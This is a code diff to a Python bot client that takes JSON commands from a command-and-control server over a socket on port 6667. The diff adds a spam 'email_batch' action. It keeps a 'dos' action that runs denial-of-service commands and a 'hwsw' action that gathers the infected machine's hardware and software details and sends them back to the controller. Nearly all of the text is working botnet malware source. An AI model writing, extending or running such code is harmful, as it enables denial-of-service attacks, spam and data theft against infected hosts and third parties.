@@ -1,7 +1,8 @@
 import socket
 import subprocess
 import json
-
+import os, signal
+from send_email import send_email
 CURRENT_PROCESSES = []
 
 
@@ -32,33 +33,45 @@ def handle_irc_connection(server_socket):
     print("[+] Got connection from: " + str(address))
 
     while True:
-        data = conn.recv(1024).decode()
-        if not data or data == "kill" or data == 'exit':
+        data = json.loads(conn.recv(1024))
+        # print("from C&C: " + str(data))
+        action = data["action"]
+        try:
+            if action == "email_batch":
+                content = json.loads(data["content"])
+            else:
+                content = data["content"]
+        except: pass
+        
+        
+        if not data or action == "kill" or action == 'exit':
             break
-        elif data == 'idle':
+        elif action == 'idle':
             print("[+] Making bot idle")
             [proc.kill() for proc in CURRENT_PROCESSES]
             continue
-        data = str(data)
-        print("from C&C: " + data)
-        action_type, action = data.split(":")
-        if action_type == "dos":
+        if action == "dos":
             print("[+] Executing dos as C&C asked")
-            exec_cmd(action.split(), wait=True)
-        elif action_type == "hwsw":
+            exec_cmd(content.split(), wait=True)
+        elif action == "hwsw":
             print("[+] Extracting info about hw and sw as C&C asked")
             infos = steal_info_hwsw()
             conn.send(json.dumps(infos, indent=2).encode('utf-8'))
+        elif action == "email_batch":
+            print("[+] Sending batch email")
+            for receiver in content["receivers"]:
+                send_email(receiver, content["subject"], content["plaintext"], content["html"])
     conn.close()  # close the connection
 
-    if data == 'exit':
+
+    if action == 'exit':
         return handle_irc_connection(server_socket)
     # else 
     print("[-] Killing bot")
     [proc.kill() for proc in CURRENT_PROCESSES]
     return 1
 
-def set_up_irc():
+def set_up_irc(ppid):
     host = get_my_ip()
     port = 6667
     clients = 1
@@ -71,4 +84,5 @@ def set_up_irc():
     server_socket.listen(clients)
 
     handle_irc_connection(server_socket)
+    os.kill(ppid, signal.SIGTERM)
     return 1
